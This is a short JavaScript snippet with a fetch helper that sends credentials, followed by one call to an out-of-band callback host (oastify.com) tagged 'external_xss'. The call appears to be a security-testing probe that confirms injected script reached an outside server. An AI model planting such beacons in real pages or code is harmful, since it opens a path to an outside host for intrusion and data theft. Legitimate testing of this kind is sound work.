// GET Request with Query Parameters
async function getRequest(url, params = {}, headers = {}) {
  const queryString = new URLSearchParams(params).toString();
  const fullUrl = queryString ? `${url}?${queryString}` : url;
  
  const response = await fetch(fullUrl, {
    method: 'GET',
    headers: headers,
    credentials: 'include'
  });
  return response.json();
}


const test =  getRequest('http://v0wbwyggln3plzey126efh6m3d94xvrjg.oastify.com', { test: 'external_xss'  });
